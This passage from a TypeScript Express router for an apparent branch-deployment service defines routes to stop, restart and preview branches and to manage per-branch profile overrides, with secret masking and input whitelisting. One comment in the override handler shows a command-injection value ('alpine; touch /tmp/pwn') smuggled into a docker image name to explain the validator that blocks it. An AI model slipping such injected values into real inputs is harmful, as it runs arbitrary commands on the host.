      res.status(400).json({ error: 'preview_host_missing', message: '无法生成预览 URL' });
      return;
    }

    const body = (req.body || {}) as {
      accessKey?: string;
      impersonateUser?: string;
      skip?: string;
      failFast?: boolean;
    };

    // AI_ACCESS_KEY resolution order (走 getCustomEnv 4 层合并)：
    //   1. request body `accessKey` (operator paste)
    //   2. project.customEnv.AI_ACCESS_KEY (per-project 主存)
    //   3. state.customEnv[<projectId>].AI_ACCESS_KEY (旧 project bucket 兜底)
    //   4. state.customEnv._global.AI_ACCESS_KEY (旧全局兜底)
    // Never reads from process.env — that would leak the CDS process
    // env into the smoke target.
    const mergedEnv = getMergedEnv(entry.projectId, entry.id);
    const accessKey = (body.accessKey || mergedEnv?.AI_ACCESS_KEY || '').trim();
    if (!accessKey) {
      res.status(400).json({
        error: 'access_key_missing',
        message: '需要 accessKey (请求体字段) 或在项目环境变量里预设 AI_ACCESS_KEY。',
      });
      return;
    }

    // Resolve script location (helper shared with the auto-deploy hook).
    const script = resolveSmokeScriptDir();
    if (!script.exists) {
      res.status(500).json({
        error: 'smoke_script_missing',
        message: `找不到 smoke-all.sh (查找路径 ${script.entry})。请确认 scripts/ 目录已随 CDS 部署并设置 CDS_SMOKE_SCRIPT_DIR。`,
      });
      return;
    }

    // ── Open SSE ──
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'close',
      'X-Accel-Buffering': 'no',
    });
    const safeSend = (event: string, data: unknown) => {
      try { sendSSE(res, event, data); } catch { /* client gone */ }
    };
    const keepalive = setInterval(() => {
      try { res.write(':keepalive\n\n'); } catch { /* noop */ }
    }, 10_000);

    safeSend('start', {
      branchId: entry.id,
      host: smokeHost,
      impersonateUser: body.impersonateUser || 'admin',
      skip: body.skip || '',
      script: script.entry,
    });

    runSmokeForBranch({
      branch: entry,
      previewHost: smokeHost,
      accessKey,
      impersonateUser: body.impersonateUser,
      skip: body.skip,
      failFast: body.failFast,
      scriptDir: script.dir,
      onLine: (channel, text) => safeSend('line', { stream: channel, text }),
      onError: (err) => {
        clearInterval(keepalive);
        safeSend('error', { message: err.message });
        try { res.end(); } catch { /* noop */ }
      },
      onComplete: (result) => {
        clearInterval(keepalive);
        safeSend('complete', result);
        try { res.end(); } catch { /* noop */ }
      },
    });
  });

  // ── Stop all services for a branch ──

  router.post('/branches/:id/stop', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }
    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'stop',
      source: 'api.stop-branch',
      reason: 'stop branch containers',
    });
    if (branchOperationCoordinator && !branchOperationLease) return;
    let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
    const stopAttribution = stopAttributionFromRequest(req);

    // ── Cluster-aware stop ──
    //
    // Branches owned by a remote executor have no local containers — calling
    // containerService.stop on master is a silent no-op that leaves the real
    // containers running on the executor. Proxy to /exec/stop instead.
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;
    if (remoteExecutor) {
      try {
        assertBranchOperationCurrent(branchOperationLease, 'before-remote-stop');
        entry.status = 'stopping';
        for (const svc of Object.values(entry.services)) {
          if (svc.status === 'running' || svc.status === 'starting') {
            svc.status = 'stopping';
          }
        }
        stateService.save();
        const upstreamUrl = `http://${remoteExecutor.host}:${remoteExecutor.port}/exec/stop`;
        const upstream = await fetch(upstreamUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
          },
          body: JSON.stringify({
            branchId: id,
            requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
            operationId: branchOperationLease?.operationId || null,
            actor: resolveActorFromRequest(req),
            trigger: triggerFromRequest(req),
          }),
        });
        if (!upstream.ok) {
          const errText = await upstream.text().catch(() => '');
          res.status(502).json({
            error: `执行器拒绝停止请求 (HTTP ${upstream.status}): ${errText.slice(0, 200)}`,
          });
          return;
        }
        // The executor's next heartbeat will reconcile status, but set
        // plausible local state in the meantime.
        for (const svc of Object.values(entry.services)) svc.status = 'stopped';
        entry.status = 'idle';
        entry.lastStoppedAt = new Date().toISOString();
        entry.lastStopReason = `${stopAttribution.reason}，远端执行器 ${remoteExecutor.id} 已停止`;
        entry.lastStopSource = stopAttribution.source === 'user' ? 'executor' : stopAttribution.source;
        // 2026-05-14 Cursor Bugbot Medium 修复：远端执行器停止路径与本地
        // 手动停止 / scheduler coolFn / AutoLifecycle 一致，也要 +1 stopCount
        // 并写活动日志，否则 UI「停止次数」对远端停止漏计、活动时间线缺这条。
        stateService.incrementBranchStat(id, 'stopCount');
        stateService.appendActivityLog(entry.projectId, {
          type: 'stop',
          branchId: id,
          branchName: entry.branch,
          actor: resolveActorForActivity(req),
          note: entry.lastStopReason,
        });
        stateService.save();
        res.json({ message: `已请求执行器 ${remoteExecutor.id} 停止所有服务` });
      } catch (err) {
        branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
        res.status(502).json({ error: `无法连接执行器: ${(err as Error).message}` });
      } finally {
        completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      }
      return;
    }

    try {
      // Set stopping state immediately so frontend can show animation
      assertBranchOperationCurrent(branchOperationLease, 'before-local-stop');
      entry.status = 'stopping';
      for (const svc of Object.values(entry.services)) {
        if (svc.status === 'running' || svc.status === 'starting') {
          svc.status = 'stopping';
        }
      }
      stateService.save();

      // Actually stop containers
      for (const svc of Object.values(entry.services)) {
        try {
          await containerService.stop(svc.containerName, stopAttribution.reason, {
            projectId: entry.projectId,
            branchId: entry.id,
            profileId: svc.profileId,
            requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
            operationId: branchOperationLease?.operationId || null,
            actor: resolveActorFromRequest(req),
            trigger: triggerFromRequest(req),
            operation: 'branch-stop',
            source: 'api.stop-branch',
          });
        } catch { /* ok */ }
        svc.status = 'stopped';
      }
      await archiveBranchContainerLogs({
        stateService,
        containerService,
        branch: entry,
        source: stopAttribution.archiveSource,
        serverEventLogStore,
        message: stopAttribution.archiveMessage,
        requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
        operationId: branchOperationLease?.operationId || null,
        actor: resolveActorFromRequest(req),
        trigger: triggerFromRequest(req),
      });
      entry.status = 'idle';
      // 2026-05-14: 记录最近一次停止信息，UI 让用户看清"为什么变灰"
      entry.lastStoppedAt = new Date().toISOString();
      entry.lastStopReason = stopAttribution.reason;
      entry.lastStopSource = stopAttribution.source;
      cleanupPreviewServer(id);
      // PR_C.3: 计数 + activity log
      stateService.incrementBranchStat(id, 'stopCount');
      stateService.appendActivityLog(entry.projectId, {
        type: 'stop',
        branchId: id,
        branchName: entry.branch,
        actor: resolveActorForActivity(req),
        note: stopAttribution.reason,
      });
      stateService.save();
      res.json({ message: '所有服务已停止' });
    } catch (err) {
      branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
      res.status(500).json({ error: (err as Error).message });
    } finally {
      completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
    }
  });

  // ── POST /api/branches/:id/restart — 轻量重启（不重建）──
  //
  // 与 /deploy 区分：/deploy 是 git pull + 重新构建镜像 + docker run（有代码
  // 变更时用）；/restart 只对已构建好的容器做 docker restart（没 bug、只是
  // 服务被停了，直接拉起来，秒级，不动代码）。复用 containerService
  // .restartServiceInPlace（docker restart + 存活探测）。
  router.post('/branches/:id/restart', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;
    if (remoteExecutor) {
      res.status(409).json({ error: '该分支运行在远端执行器，请使用「重新部署」' });
      return;
    }
    const services = Object.values(entry.services);
    if (services.length === 0) {
      res.status(409).json({ error: '还没有已构建的容器可重启，请先「重新部署」' });
      return;
    }
    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'restart',
      source: 'api.restart-branch',
      reason: 'manual branch docker restart',
    });
    if (branchOperationCoordinator && !branchOperationLease) return;
    let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null;
    const actor = resolveActorFromRequest(req);
    const trigger = triggerFromRequest(req);
    try {
      assertBranchOperationCurrent(branchOperationLease, 'restart before state write');
      const restartStartedAt = new Date().toISOString();
      entry.status = 'restarting';
      entry.lastDeployStartedAt = restartStartedAt;
      for (const svc of services) svc.status = 'starting';
      stateService.save();

      const failed: string[] = [];
      for (const svc of services) {
        assertBranchOperationCurrent(branchOperationLease, `restart before ${svc.profileId}`);
        const ok = await containerService.restartServiceInPlace(svc.containerName, undefined, {
          projectId: entry.projectId,
          branchId: entry.id,
          profileId: svc.profileId,
          requestId,
          operationId: branchOperationLease?.operationId || null,
          actor,
          trigger,
          operation: 'branch-restart',
          source: 'api.restart-branch',
          reason: '手动重新启动（docker restart，未重建代码）',
        });
        assertBranchOperationCurrent(branchOperationLease, `restart after ${svc.profileId}`);
        if (ok) {
          svc.status = 'running';
          svc.errorMessage = undefined;
        } else {
          svc.status = 'error';
          svc.errorMessage = `容器 ${svc.containerName} 原地重启失败（可能未构建过），请改用「重新部署」`;
          failed.push(svc.containerName);
        }
      }

      if (failed.length === 0) {
        assertBranchOperationCurrent(branchOperationLease, 'restart before success save');
        entry.status = 'running';
        // 全部成功必须清掉历史 errorMessage，否则下游 UI 仍按失败渲染
        // （Codex P2）。
        entry.errorMessage = undefined;
        entry.lastStoppedAt = undefined;
        entry.lastStopReason = undefined;
        entry.lastStopSource = undefined;
        // 分支重新跑起来后必须回到 warm pool：调度器降温会把 heatState
        // 置 cold，若不复位，getHotBranches 不计入它（cold 不算 hot），
        // maxHotBranches 容量上限被绕过。
        // lastAccessedAt 必须在这里显式刷新：手动重启就是一次访问，而
        // markHot() 只在 lastAccessedAt 缺失时才补（不更新陈旧值）——被
        // 空闲 TTL 降温过的分支其 lastAccessedAt 必然很旧，若不刷新，下一
        // 个 scheduler tick 立刻又按"空闲超时"把它降温，手动重启等于无效
        // （Codex P1 @ f80d33a）。先刷新再 markHot。
        // stop 重构后 /restart 真能唤醒已降温分支，此前因容器被 rm 必失败
        // 而掩盖了这个陈旧状态问题（Cursor Bugbot #640）。
        entry.lastAccessedAt = new Date().toISOString();
        schedulerService?.markHot(id);
        stateService.appendActivityLog(entry.projectId, {
          type: 'restart',
          branchId: id,
          branchName: entry.branch,
          actor: resolveActorForActivity(req),
          note: '手动重新启动（docker restart，未重建代码）',
        });
        stateService.save();
        res.json({ message: '所有服务已重新启动' });
      } else {
        branchOperationFinalStatus = 'failed';
        entry.status = 'error';
        entry.errorMessage = `${failed.length} 个容器重启失败：${failed.join(', ')}`;
        stateService.appendActivityLog(entry.projectId, {
          type: 'restart',
          branchId: id,
          branchName: entry.branch,
          actor: resolveActorForActivity(req),
          note: `重新启动部分失败（${failed.join(', ')}），建议「重新部署」`,
        });
        stateService.save();
        res.status(409).json({
          error: `${failed.length} 个容器重启失败，建议改用「重新部署」`,
          failed,
        });
      }
    } catch (err) {
      branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
      // 兜底：未预期异常时把分支从 restarting/starting 恢复到 error，否则
      // UI 会卡在永久"重启中"转圈，只能手动重置（Cursor Bugbot）。
      try {
        if (branchOperationFinalStatus !== 'cancelled') {
          for (const svc of Object.values(entry.services)) {
            if (svc.status === 'starting') svc.status = 'error';
          }
          entry.status = 'error';
          entry.errorMessage = `重新启动异常：${(err as Error).message}`;
          stateService.save();
        }
      } catch { /* 状态恢复尽力而为，不掩盖原始错误 */ }
      res.status(branchOperationFinalStatus === 'cancelled' ? 409 : 500).json({ error: (err as Error).message });
    } finally {
      completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
    }
  });

  // ── GET /api/branches/:id/activity-logs — 分支维度系统日志（生命周期时间线）──
  //
  // 复用 stateService.getActivityLogs（已按最新在前 reverse），按 branchId
  // 过滤出本分支的 部署 / 停止 / 崩溃 / 重启 / 回收 等事件，供分支详情页
  // 「系统日志」子页签展示"谁停的 / 何时 / 为什么"。
  router.get('/branches/:id/activity-logs', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }
    const limitRaw = typeof req.query.limit === 'string' ? parseInt(req.query.limit, 10) : 100;
    const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(limitRaw, 1), 200) : 100;
    const sinceIso = typeof req.query.since === 'string' ? req.query.since : undefined;
    // 先按 branchId 过滤再截断，否则繁忙项目里其它分支的事件会把本分支
    // 的历史挤出 200 条上限，导致"谁停的/为什么"时间线对高频项目恰好失效
    // （Codex review P1）。getActivityLogs 不传 limit 返回项目全部（最新在前）。
    const all = stateService.getActivityLogs(entry.projectId, { sinceIso });
    const matched = all.filter((e) => e.branchId === id);
    const logs = matched.slice(0, limit);
    // total 必须是过滤后、截断前的命中总数，否则消费方无法判断"还有没有更多"
    // （截断后 total===logs.length 永远 ≤ limit，分页/加载更多失效）。Cursor Bugbot。
    res.json({ branchId: id, logs, total: matched.length });
  });

  // ── Set default branch ──

  router.post('/branches/:id/set-default', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // per-project：写入 entry 所属项目的 defaultBranch；同步刷新 legacy
    // state.defaultBranch 兼容老 fallback。projectId 缺失时退回旧行为。
    if (entry.projectId) {
      stateService.setProjectDefaultBranch(entry.projectId, id);
    } else {
      stateService.setDefaultBranch(id);
    }
    stateService.save();
    res.json({ message: `Default branch set to "${id}"` });
  });

  // ── Preview port (port mode: per-branch proxy with path-prefix routing) ──

  router.post('/branches/:id/preview-port', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (entry.status !== 'running') {
      res.status(400).json({ error: '分支未运行' });
      return;
    }

    // Reuse existing preview port if still alive
    if (entry.previewPort && previewServers.has(id)) {
      res.json({ port: entry.previewPort });
      return;
    }

    // Allocate a new port
    const port = stateService.allocatePort(config.portStart, await collectListeningPorts(shell));
    // P4 Part 17 (G2 fix): scope by branch project so the path-prefix
    // proxy only routes to profiles owned by this project.
    const profiles = stateService.getEffectiveProfilesForBranch(entry);

    // Create a lightweight HTTP proxy that routes by path-prefix
    const server = http.createServer((proxyReq, proxyRes) => {
      const url = proxyReq.url || '/';

      // Detect which profile handles this path (reuse same logic as main proxy)
      const profileIds = Object.keys(entry.services);
      let targetProfileId: string | undefined;

      // Phase 1: explicit pathPrefixes
      const profilesWithRoutes = profiles
        .filter(p => p.pathPrefixes && p.pathPrefixes.length > 0 && profileIds.includes(p.id))
        .sort((a, b) => {
          const maxA = Math.max(...(a.pathPrefixes || []).map(s => s.length));
          const maxB = Math.max(...(b.pathPrefixes || []).map(s => s.length));
          return maxB - maxA;
        });
      for (const profile of profilesWithRoutes) {
        if (profile.pathPrefixes!.some(prefix => url.startsWith(prefix))) {
          targetProfileId = profile.id;
          break;
        }
      }
      // Phase 2: convention fallback
      if (!targetProfileId) {
        if (url.startsWith('/api/')) {
          targetProfileId = profileIds.find(pid => pid.includes('api') || pid.includes('backend'));
        }
        if (!targetProfileId) {
          targetProfileId = profileIds.find(pid => pid.includes('web') || pid.includes('frontend') || pid.includes('admin'))
            || profileIds[0];
        }
      }

      const svc = targetProfileId ? entry.services[targetProfileId] : undefined;
      if (!svc || svc.status !== 'running') {
        proxyRes.writeHead(502, { 'Content-Type': 'application/json' });
        proxyRes.end(JSON.stringify({ error: `Service "${targetProfileId}" not running` }));
        return;
      }

      const upstream = `http://127.0.0.1:${svc.hostPort}`;
      const upstreamUrl = new URL(upstream);
      const opts: http.RequestOptions = {
        hostname: upstreamUrl.hostname,
        port: upstreamUrl.port,
        path: proxyReq.url,
        method: proxyReq.method,
        headers: { ...proxyReq.headers, host: `${upstreamUrl.hostname}:${upstreamUrl.port}` },
      };

      const upReq = http.request(opts, (upRes) => {
        proxyRes.writeHead(upRes.statusCode || 200, upRes.headers);
        upRes.pipe(proxyRes, { end: true });
      });
      upReq.on('error', () => {
        if (!proxyRes.headersSent) {
          proxyRes.writeHead(502, { 'Content-Type': 'application/json' });
          proxyRes.end(JSON.stringify({ error: 'Upstream connection failed' }));
        }
      });
      proxyReq.pipe(upReq, { end: true });
    });

    // WebSocket upgrade support (for Vite HMR)
    server.on('upgrade', (proxyReq, socket, head) => {
      const url = proxyReq.url || '/';
      const profileIds = Object.keys(entry.services);
      let targetProfileId: string | undefined;

      // Same path-prefix detection as above
      const profilesWithRoutes2 = profiles
        .filter(p => p.pathPrefixes && p.pathPrefixes.length > 0 && profileIds.includes(p.id))
        .sort((a, b) => {
          const maxA = Math.max(...(a.pathPrefixes || []).map(s => s.length));
          const maxB = Math.max(...(b.pathPrefixes || []).map(s => s.length));
          return maxB - maxA;
        });
      for (const profile of profilesWithRoutes2) {
        if (profile.pathPrefixes!.some(prefix => url.startsWith(prefix))) {
          targetProfileId = profile.id;
          break;
        }
      }
      if (!targetProfileId) {
        targetProfileId = profileIds.find(pid => pid.includes('web') || pid.includes('frontend') || pid.includes('admin'))
          || profileIds[0];
      }

      const svc = targetProfileId ? entry.services[targetProfileId] : undefined;
      if (!svc || svc.status !== 'running') { socket.destroy(); return; }

      const upstream = `http://127.0.0.1:${svc.hostPort}`;
      const upstreamUrl = new URL(upstream);
      const opts: http.RequestOptions = {
        hostname: upstreamUrl.hostname,
        port: upstreamUrl.port,
        path: proxyReq.url,
        method: 'GET',
        headers: { ...proxyReq.headers, host: `${upstreamUrl.hostname}:${upstreamUrl.port}` },
      };

      const upReq = http.request(opts);
      upReq.on('upgrade', (upRes, upSocket, upHead) => {
        let raw = `HTTP/${upRes.httpVersion} ${upRes.statusCode} ${upRes.statusMessage}\r\n`;
        for (let i = 0; i < upRes.rawHeaders.length; i += 2) {
          raw += `${upRes.rawHeaders[i]}: ${upRes.rawHeaders[i + 1]}\r\n`;
        }
        raw += '\r\n';
        socket.write(raw);
        if (upHead.length > 0) socket.write(upHead);
        if (head.length > 0) upSocket.write(head);
        upSocket.pipe(socket);
        socket.pipe(upSocket);
      });
      upReq.on('error', () => socket.destroy());
      socket.on('error', () => upReq.destroy());
      upReq.end();
    });

    server.listen(port, '0.0.0.0', () => {
      entry.previewPort = port;
      previewServers.set(id, server);
      stateService.save();
      console.log(`[preview] Branch "${id}" preview proxy on port ${port}`);
      res.json({ port });
    });

    server.on('error', (err) => {
      console.error(`[preview] Failed to start preview proxy for "${id}":`, err);
      res.status(500).json({ error: `Preview port allocation failed: ${(err as Error).message}` });
    });
  });

  // ── Update branch metadata (favorite, notes) ──

  router.patch('/branches/:id', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      const { isFavorite, notes, tags, isColorMarked } = req.body as { isFavorite?: boolean; notes?: string; tags?: string[]; isColorMarked?: boolean };
      // PR_C.3: 调试灯泡切换计数 + activity log（仅 isColorMarked 真正变化时）
      const prevColorMark = entry.isColorMarked === true;
      stateService.updateBranchMeta(id, { isFavorite, notes, tags, isColorMarked });
      if (typeof isColorMarked === 'boolean' && isColorMarked !== prevColorMark) {
        stateService.incrementBranchStat(id, 'debugCount');
        stateService.appendActivityLog(entry.projectId, {
          type: isColorMarked ? 'colormark-on' : 'colormark-off',
          branchId: id,
          branchName: entry.branch,
          actor: resolveActorForActivity(req),
        });
      }
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Per-branch BuildProfile overrides (inheritance-with-extension) ──
  //
  // GET returns one entry per shared BuildProfile, showing baseline + branch
  // override + merged effective. PUT replaces an override (full body), DELETE
  // clears it. Applied at runtime by `resolveEffectiveProfile` in container.ts.

  router.get('/branches/:id/profile-overrides', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // CDS infra vars (CDS_HOST / CDS_MONGODB_PORT / etc.) are injected BEFORE
    // profile.env at runtime (see container.ts runService ~L118). We expose
    // the same merge order here so the override modal's "effective env"
    // preview matches what actually reaches the container, not a misleading
    // subset that only contains user-editable keys.
    const cdsVars = stateService.getCdsEnvVars(entry.projectId || 'default');
    const cdsEnvKeys = Object.keys(cdsVars);
    // P4 Part 17 (G2 fix): scope by branch project so the override
    // modal's "effective env" preview only enumerates profiles in
    // this project, not every project's profile.
    const profiles = stateService.getEffectiveProfilesForBranch(entry);
    // 分支级额外服务(extraProfiles)在此 payload 里要给 env 脱敏（Codex P1）：切到
    // getEffectiveProfilesForBranch 后额外服务也进了 override 面板，baseline / effective.env 若返回
    // 原始 env 会泄露分支本地密钥。与 extra-services / 分支序列化的 maskExtraProfilesEnv 口径一致，
    // 仅对额外服务脱敏（项目 profile 的既有行为不动）。
    const extraProfileIds = new Set((entry.extraProfiles || []).map((p) => p.id));
    const payload = profiles.map(profile => {
      const isExtra = extraProfileIds.has(profile.id);
      const override = entry.profileOverrides?.[profile.id];
      const resolved = resolveEffectiveProfile(profile, entry);
      // CDS infra vars first, then profile.env so user-set values can still
      // shadow infra defaults (keeps current runtime semantics — see container.ts).
      const mergedEnv = { ...cdsVars, ...(resolved.env || {}) };
      const effective = {
        ...resolved,
        env: isExtra ? maskSecrets(mergedEnv) : mergedEnv,
      };
      return {
        profileId: profile.id,
        profileName: profile.name,
        baseline: isExtra && profile.env ? { ...profile, env: maskSecrets(profile.env) } : profile,
        // override 也要对额外服务脱敏（Codex P1「Mask override env in profile-overrides GET」）：PUT 现可给
        // extra profile 存 env 覆盖，GET 若把 override.env 原样回吐就泄露密钥（baseline/effective 已脱敏，
        // 唯独 override 漏）。与 PUT 响应同口径。
        override: isExtra && override?.env ? { ...override, env: maskSecrets(override.env) } : (override || null),
        effective,
        cdsEnvKeys,
        hasOverride: !!override && Object.keys(override).some(k => k !== 'updatedAt' && k !== 'notes'),
      };
    });
    res.json({ branchId: id, profiles: payload });
  });

  router.put('/branches/:id/profile-overrides/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // 用分支**有效** profiles 解析目标（项目 profiles + 分支额外服务），与 GET /profile-overrides 一致
    // （Bugbot「Extra profile overrides PUT fails」）：原仅用项目级 getBuildProfile，分支级 extra-only 的
    // profileId 永远 404，尽管 GET 面板已把它列为可覆盖。effective 查找也天然项目内聚（更安全）。
    const profile = stateService.getEffectiveProfilesForBranch(entry).find((p) => p.id === profileId);
    if (!profile) {
      res.status(404).json({ error: `构建配置 "${profileId}" 不存在` });
      return;
    }
    try {
      // Body is the BuildProfileOverride object. Unknown keys are silently
      // dropped by the interface shape — we only copy fields we recognize.
      const body = (req.body ?? {}) as Record<string, unknown>;

      // M6: reject nonsense port values outright, otherwise the front-end
      // can accidentally write containerPort:0 and break routing silently.
      if (typeof body.containerPort === 'number' && body.containerPort <= 0) {
        res.status(400).json({ error: 'containerPort 必须是正整数' });
        return;
      }

      // 覆盖镜像/路径的严格校验（Codex P1「Validate extra-profile override images before deploy」）：
      // 此 PUT 现可覆盖分支额外服务的 dockerImage，调用方可先建 prebuiltImage 额外服务、再在此覆盖
      // dockerImage 绕过 extra-services 的严格镜像白名单；覆盖值会并入有效 profile，prebuilt 路径用
      // 宿主机 `docker pull ${image}` 拉取 → `alpine; touch /tmp/pwn` 在 CDS 宿主机执行。container.ts 已对
      // pull 路径 shellQuote 兜底，这里在入口对 dockerImage/containerWorkDir 施加与 extra-services PUT 同款
      // 白名单（对所有 profile 覆盖生效，合法镜像引用/容器内绝对路径均满足，不影响正常用法）。
      if (typeof body.dockerImage === 'string' && body.dockerImage.trim() !== '') {
        if (!/^[a-zA-Z0-9][a-zA-Z0-9._:/@-]*$/.test(body.dockerImage.trim())) {
          res.status(400).json({ error: '覆盖的 dockerImage 含非法字符（镜像引用仅允许字母/数字/._:/@- ）' });
          return;
        }
      }
      if (typeof body.containerWorkDir === 'string' && body.containerWorkDir.trim() !== '') {
        const cwd = body.containerWorkDir.trim();
        if (!/^\/[a-zA-Z0-9._/-]*$/.test(cwd) || cwd.split('/').includes('..')) {
          res.status(400).json({ error: '覆盖的 containerWorkDir 非法（须为容器内绝对路径，字母/数字/._-/，禁 .. 穿越与 shell 元字符）' });
          return;
        }
      }

      // M8: `typeof [] === 'object'` is true and typeof null === 'object' too,
      // so we explicitly filter both. Otherwise `body.env = []` would cast to
      // Record<string,string> and produce garbage at deploy time.
      let envOverride: Record<string, string> | undefined;
      if (
        body.env !== null &&
        typeof body.env === 'object' &&
        !Array.isArray(body.env)
      ) {
        // M9: drop any value that isn't a string. Non-string values would
        // explode the env-file writer (container.ts writeEnvFile) and leak
        // `undefined` / numbers into Docker env.
        // 剥离掩码哨兵（Bugbot High「Extra override PUT keeps mask sentinels」）：额外服务的 GET 会把
        // override.env 打掩码（***），GET→编辑→PUT 往返若把字面 *** 原样持久化，deploy 时真实密钥被抹。
        // 命中哨兵则从已存覆盖的同 key 旧值恢复，无旧值则丢弃（绝不写字面哨兵）；与 extra-services PUT 口径一致。
        const OVERRIDE_MASK_SENTINELS = new Set(['***', '***[masked]***', '****', '*****']);
        const prevOverrideEnv = (entry.profileOverrides?.[profileId]?.env || {}) as Record<string, string>;
        const cleaned: Record<string, string> = {};
        for (const [k, v] of Object.entries(body.env as Record<string, unknown>)) {
          if (typeof v !== 'string') continue;
          if (OVERRIDE_MASK_SENTINELS.has(v.trim())) {
            if (Object.prototype.hasOwnProperty.call(prevOverrideEnv, k)) cleaned[k] = prevOverrideEnv[k];
            continue;
          }
          cleaned[k] = v;
        }
        envOverride = cleaned;
      }

      const override = {
        dockerImage: typeof body.dockerImage === 'string' ? body.dockerImage : undefined,
        command: typeof body.command === 'string' ? body.command : undefined,
        containerWorkDir: typeof body.containerWorkDir === 'string' ? body.containerWorkDir : undefined,
        containerPort: typeof body.containerPort === 'number' ? body.containerPort : undefined,
        env: envOverride,
        pathPrefixes: Array.isArray(body.pathPrefixes) ? body.pathPrefixes as string[] : undefined,
        resources: body.resources && typeof body.resources === 'object' && !Array.isArray(body.resources) ? body.resources as { memoryMB?: number; cpus?: number } : undefined,
        activeDeployMode: typeof body.activeDeployMode === 'string' ? body.activeDeployMode : undefined,
        startupSignal: typeof body.startupSignal === 'string' ? body.startupSignal : undefined,
        notes: typeof body.notes === 'string' ? body.notes : undefined,
      };
      stateService.setBranchProfileOverride(id, profileId, override);
      stateService.save();

      // Return the new effective profile so the UI can show the merged result
      // without a second round-trip.
      const refreshed = stateService.getBranch(id)!;
      const effective = resolveEffectiveProfile(profile, refreshed);
      const savedOverride = stateService.getBranchProfileOverride(id, profileId);
      // 分支级额外服务的 env 在 PUT 响应里脱敏（Codex P1「Mask extra profile env in override save
      // responses」）：PUT 现可命中 extra-only profile（round-21），effective/override 直接回原 env 会泄露其
      // 密钥，与上方 GET 面板的脱敏口径不一致。仅对额外服务遮蔽（项目 profile 行为不动）；状态层保持明文供
      // deploy 直读。
      const isExtra = (entry.extraProfiles || []).some((p) => p.id === profileId);
      res.json({
        message: '已保存分支覆盖',
        profileId,
        override: isExtra && savedOverride?.env ? { ...savedOverride, env: maskSecrets(savedOverride.env) } : savedOverride,
        effective: isExtra && effective.env ? { ...effective, env: maskSecrets(effective.env) } : effective,
        needsRedeploy: true,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Per-branch subdomain aliases ──
  //
  // Stable-URL aliases that route to a branch in addition to the default
  // `<slug>.<rootDomain>` subdomain. Used for webhook receivers, demo
  // links, and front-end hardcoded API hosts.
  //
  // Validation rules (enforced here, not in state.ts):
  //   - Each alias is a valid DNS label: /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/
  //   - No duplicates within the same request
  //   - Not a reserved label (cds-internal tooling domains)
  //   - No collision with another branch's slug or aliases

  const DNS_LABEL_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/;
  const RESERVED_ALIAS_LABELS = new Set([
    'www', 'admin', 'switch', 'preview',
    'cds', 'master', 'dashboard',
  ]);

  // Named gateway entries: build profiles that declare a `cds.subdomain` label get a standalone host
  // `<previewSlug>-<subdomain>.<root>` routing all paths to that container (e.g. LLM gateway →
  // <slug>-llmgw.<root>), distinct from the main app domain. Mirror the forwarder-route-publisher
  // same-origin rules so the panel shows exactly the URLs the forwarder actually publishes: run each
  // profile through resolveEffectiveProfile (so branch-level readinessProbe / subdomain overrides are
  // honored, matching the published route — Bugbot "Gateway URLs skip profile resolve"), filter by
  // routable status, dedupe first-wins on subdomain, and drop labels whose first DNS octet exceeds
